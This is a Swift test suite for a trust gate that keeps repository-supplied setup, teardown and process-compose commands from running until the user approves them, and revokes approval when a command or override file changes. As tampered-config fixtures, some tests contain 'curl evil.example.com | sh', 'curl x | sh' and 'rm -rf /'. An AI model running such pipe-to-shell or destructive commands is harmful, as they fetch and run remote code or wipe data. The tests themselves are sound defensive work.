// ABOUTME: Tests for approval of repository-provided setup/run/teardown commands.
// ABOUTME: Covers fingerprinting, per-project scoping, and the teardown execution gate.

@testable import Atelier
import XCTest

final class ScriptTrustTests: XCTestCase {
    private var tmpDir: URL!

    override func setUp() {
        super.setUp()
        tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try! FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)
    }

    override func tearDown() {
        // Each test works under a fresh temporary path, so only those need clearing.
        ScriptTrust.revoke(for: tmpDir.path)
        ScriptTrust.revoke(for: tmpDir.path + "/other")
        ScriptTrust.revokeConfigFiles(for: tmpDir.path)
        ScriptTrust.revokeConfigFiles(for: tmpDir.path + "/other")
        try? FileManager.default.removeItem(at: tmpDir)
        super.tearDown()
    }

    // MARK: - Default posture

    func testConfigWithoutScriptsNeedsNoApproval() {
        XCTAssertTrue(ScriptTrust.isApproved(.empty, for: tmpDir.path))
    }

    func testConfigWithScriptsIsNotApprovedByDefault() {
        let config = makeConfig(setup: "open -a Calculator")
        XCTAssertFalse(ScriptTrust.isApproved(config, for: tmpDir.path))
    }

    func testApprovalGrantsExecution() {
        let config = makeConfig(setup: "npm install")
        ScriptTrust.approve(config, for: tmpDir.path)
        XCTAssertTrue(ScriptTrust.isApproved(config, for: tmpDir.path))
    }

    // MARK: - Approval is bound to command content

    func testEditedCommandRequiresReapproval() {
        let approved = makeConfig(setup: "npm install")
        ScriptTrust.approve(approved, for: tmpDir.path)

        let tampered = makeConfig(setup: "npm install && curl evil.example.com | sh")
        XCTAssertFalse(ScriptTrust.isApproved(tampered, for: tmpDir.path))
    }

    func testAddedCommandRequiresReapproval() {
        let approved = makeConfig(setup: "npm install")
        ScriptTrust.approve(approved, for: tmpDir.path)

        let withTeardown = makeConfig(setup: "npm install", teardown: "rm -rf dist")
        XCTAssertFalse(ScriptTrust.isApproved(withTeardown, for: tmpDir.path))
    }

    func testSameCommandFromDifferentConfigFileRequiresReapproval() {
        let approved = makeConfig(setup: "npm install", source: ".atelier.json")
        ScriptTrust.approve(approved, for: tmpDir.path)

        let fromFallback = makeConfig(setup: "npm install", source: "conductor.json")
        XCTAssertFalse(ScriptTrust.isApproved(fromFallback, for: tmpDir.path))
    }

    func testCommandsMovingBetweenRolesRequiresReapproval() {
        let approved = makeConfig(setup: "make build")
        ScriptTrust.approve(approved, for: tmpDir.path)

        let moved = makeConfig(teardown: "make build")
        XCTAssertFalse(ScriptTrust.isApproved(moved, for: tmpDir.path))
    }

    // MARK: - Scoping

    func testApprovalDoesNotLeakToAnotherProject() {
        let config = makeConfig(setup: "npm install")
        ScriptTrust.approve(config, for: tmpDir.path)
        XCTAssertFalse(ScriptTrust.isApproved(config, for: tmpDir.path + "/other"))
    }

    func testRevokeRemovesApproval() {
        let config = makeConfig(setup: "npm install")
        ScriptTrust.approve(config, for: tmpDir.path)
        ScriptTrust.revoke(for: tmpDir.path)
        XCTAssertFalse(ScriptTrust.isApproved(config, for: tmpDir.path))
    }

    func testReapprovalAfterEditRestoresExecution() {
        let original = makeConfig(setup: "npm install")
        ScriptTrust.approve(original, for: tmpDir.path)

        let edited = makeConfig(setup: "npm ci")
        ScriptTrust.approve(edited, for: tmpDir.path)

        XCTAssertTrue(ScriptTrust.isApproved(edited, for: tmpDir.path))
        XCTAssertFalse(ScriptTrust.isApproved(original, for: tmpDir.path))
    }

    // MARK: - Teardown execution gate

    func testTeardownDoesNotRunWithoutApproval() {
        let marker = tmpDir.appendingPathComponent("teardown-ran")
        writeTeardownConfig(touching: marker)

        ScriptConfig.runTeardown(in: tmpDir.path, projectDirectory: tmpDir.path)

        XCTAssertFalse(
            FileManager.default.fileExists(atPath: marker.path),
            "teardown from an unapproved config must not execute"
        )
    }

    func testTeardownRunsAfterApproval() {
        let marker = tmpDir.appendingPathComponent("teardown-ran")
        writeTeardownConfig(touching: marker)
        ScriptTrust.approve(ScriptConfig.load(from: tmpDir.path), for: tmpDir.path)

        ScriptConfig.runTeardown(in: tmpDir.path, projectDirectory: tmpDir.path)

        XCTAssertTrue(
            FileManager.default.fileExists(atPath: marker.path),
            "teardown from an approved config must execute"
        )
    }

    func testTeardownDoesNotRunAfterConfigChanged() {
        let marker = tmpDir.appendingPathComponent("teardown-ran")
        writeTeardownConfig(touching: marker)
        ScriptTrust.approve(ScriptConfig.load(from: tmpDir.path), for: tmpDir.path)

        let swapped = tmpDir.appendingPathComponent("swapped")
        writeTeardownConfig(touching: swapped)

        ScriptConfig.runTeardown(in: tmpDir.path, projectDirectory: tmpDir.path)

        XCTAssertFalse(
            FileManager.default.fileExists(atPath: swapped.path),
            "editing the teardown command must invalidate the earlier approval"
        )
    }

    // MARK: - Config file approval

    func testConfigFileApprovalRoundTrips() throws {
        let path = try writeConfig("processes: {}")

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path))
        ScriptTrust.approve(configFiles: [path], for: tmpDir.path)
        XCTAssertTrue(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path))
    }

    /// Approval is bound to contents, so an edited config asks again.
    func testEditingTheConfigRevokesApproval() throws {
        let path = try writeConfig("processes: {}")
        ScriptTrust.approve(configFiles: [path], for: tmpDir.path)

        _ = try writeConfig("processes:\n  web:\n    command: rm -rf /\n")

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path))
    }

    /// An unreadable file is unapproved, not trivially approved — failing open
    /// here would run something nobody could review.
    func testMissingConfigIsNotApproved() {
        XCTAssertFalse(ScriptTrust.isApproved(
            configFiles: [tmpDir.appendingPathComponent("nonexistent.yaml").path],
            for: tmpDir.path
        ))
    }

    /// Approving a file that cannot be read must not record anything, or the
    /// file could later appear approved by matching a fingerprint of nothing.
    func testApprovingAMissingConfigStoresNothing() throws {
        let missing = tmpDir.appendingPathComponent("gone.yaml").path
        ScriptTrust.approve(configFiles: [missing], for: tmpDir.path)

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [missing], for: tmpDir.path))
        // And it did not accidentally approve some other file for this project.
        let real = try writeConfig("processes: {}")
        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [real], for: tmpDir.path))
    }

    func testConfigApprovalDoesNotLeakToAnotherProject() throws {
        let path = try writeConfig("processes: {}")
        ScriptTrust.approve(configFiles: [path], for: tmpDir.path)

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path + "/other"))
    }

    /// A repository-provided config lives at a different path in every worktree.
    /// Approving the same bytes once has to cover all of them, or the user is
    /// trained to click through the pane.
    func testApprovalFollowsContentsNotPath() throws {
        let text = "processes:\n  api:\n    command: true\n"
        let first = try writeConfig(text)
        ScriptTrust.approve(configFiles: [first], for: tmpDir.path)

        let otherWorktree = tmpDir.appendingPathComponent("wt2")
        try FileManager.default.createDirectory(at: otherWorktree, withIntermediateDirectories: true)
        let second = otherWorktree.appendingPathComponent("process-compose.yaml")
        try text.write(to: second, atomically: true, encoding: .utf8)

        XCTAssertTrue(ScriptTrust.isApproved(configFiles: [second.path], for: tmpDir.path))
    }

    /// The file name is part of the fingerprint, so identical bytes under a
    /// different name are a different thing to approve.
    func testSameContentsUnderADifferentNameIsNotApproved() throws {
        let path = try writeConfig("processes: {}")
        ScriptTrust.approve(configFiles: [path], for: tmpDir.path)

        let renamed = tmpDir.appendingPathComponent("process-compose.override.yaml")
        try "processes: {}".write(to: renamed, atomically: true, encoding: .utf8)

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [renamed.path], for: tmpDir.path))
    }

    func testRevokeConfigFileRemovesApproval() throws {
        let path = try writeConfig("processes: {}")
        ScriptTrust.approve(configFiles: [path], for: tmpDir.path)
        ScriptTrust.revokeConfigFiles(for: tmpDir.path)

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path))
    }

    /// Config-file approval and script approval are separate stores. Approving
    /// one must not silently grant the other.
    func testConfigApprovalIsSeparateFromScriptApproval() throws {
        let path = try writeConfig("processes: {}")
        ScriptTrust.approve(configFiles: [path], for: tmpDir.path)

        XCTAssertFalse(ScriptTrust.isApproved(makeConfig(setup: "npm install"), for: tmpDir.path))
    }

    func testFingerprintIsNilForAnUnreadableFile() {
        XCTAssertNil(ScriptTrust.fingerprint(configFiles: [tmpDir.appendingPathComponent("nope.yaml").path]))
    }

    /// An empty list has nothing to identify. Answering "approved" would make a
    /// call site that forgot to pass the files fail open.
    func testEmptyFileListIsNeverApproved() {
        XCTAssertNil(ScriptTrust.fingerprint(configFiles: []))
        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [], for: tmpDir.path))
        ScriptTrust.approve(configFiles: [], for: tmpDir.path)
        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [], for: tmpDir.path))
    }

    /// The hole this list API exists to close. A repository ships a benign base
    /// config and an override carrying the real payload; process-compose's own
    /// discovery loads both. Approving the pair must not leave the override free
    /// to change afterwards.
    func testEditingAnOverrideRevokesApproval() throws {
        let base = try writeConfig("processes: {}")
        let override = tmpDir.appendingPathComponent("process-compose.override.yaml")
        try "processes: {}".write(to: override, atomically: true, encoding: .utf8)
        ScriptTrust.approve(configFiles: [base, override.path], for: tmpDir.path)
        XCTAssertTrue(ScriptTrust.isApproved(configFiles: [base, override.path], for: tmpDir.path))

        try "processes:\n  evil:\n    namespace: bootstrap\n    command: curl x | sh\n"
            .write(to: override, atomically: true, encoding: .utf8)

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [base, override.path], for: tmpDir.path))
    }

    /// An override that appears *after* approval changes what will execute, so
    /// it has to change what was approved.
    func testAnOverrideAppearingAfterApprovalRevokesIt() throws {
        let base = try writeConfig("processes: {}")
        ScriptTrust.approve(configFiles: [base], for: tmpDir.path)

        let override = tmpDir.appendingPathComponent("process-compose.override.yaml")
        try "processes: {}".write(to: override, atomically: true, encoding: .utf8)

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [base, override.path], for: tmpDir.path))
    }

    /// One unreadable file poisons the whole set. Hashing only what could be
    /// read would approve a list that is not the list.
    func testOneUnreadableFileMakesTheWholeSetUnapproved() throws {
        let base = try writeConfig("processes: {}")
        let missing = tmpDir.appendingPathComponent("process-compose.override.yaml").path

        XCTAssertNil(ScriptTrust.fingerprint(configFiles: [base, missing]))
        ScriptTrust.approve(configFiles: [base, missing], for: tmpDir.path)
        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [base, missing], for: tmpDir.path))
    }

    // MARK: - Helpers

    @discardableResult
    private func writeConfig(_ contents: String) throws -> String {
        let path = tmpDir.appendingPathComponent("process-compose.yaml")
        try contents.write(to: path, atomically: true, encoding: .utf8)
        return path.path
    }

    private func makeConfig(
        setup: String? = nil,
        teardown: String? = nil,
        source: String = ".atelier.json"
    ) -> ScriptConfig {
        ScriptConfig(setup: setup, teardown: teardown, source: source, loadError: nil)
    }

    private func writeTeardownConfig(touching marker: URL) {
        let path = tmpDir.appendingPathComponent(".atelier.json").path
        let data = try! JSONSerialization.data(withJSONObject: ["teardown": "touch \(marker.path)"])
        try! data.write(to: URL(fileURLWithPath: path))
    }
}

final class SetupGateStateTests: XCTestCase {
    func testSetupWaitsForApproval() {
        XCTAssertEqual(
            SetupGateState.resolve(hasSetupScript: true, setupCompleted: false, scriptsApproved: false),
            .awaitingApproval
        )
    }

    func testApprovedSetupRuns() {
        XCTAssertEqual(
            SetupGateState.resolve(hasSetupScript: true, setupCompleted: false, scriptsApproved: true),
            .running
        )
    }

    func testNoSetupScriptNeedsNoGate() {
        XCTAssertEqual(
            SetupGateState.resolve(hasSetupScript: false, setupCompleted: false, scriptsApproved: false),
            .notNeeded
        )
    }

    func testSetupDoesNotRunTwiceForTheSameWorkstream() {
        XCTAssertEqual(
            SetupGateState.resolve(hasSetupScript: true, setupCompleted: true, scriptsApproved: true),
            .notNeeded
        )
        XCTAssertEqual(
            SetupGateState.resolve(hasSetupScript: true, setupCompleted: true, scriptsApproved: false),
            .notNeeded
        )
    }
}
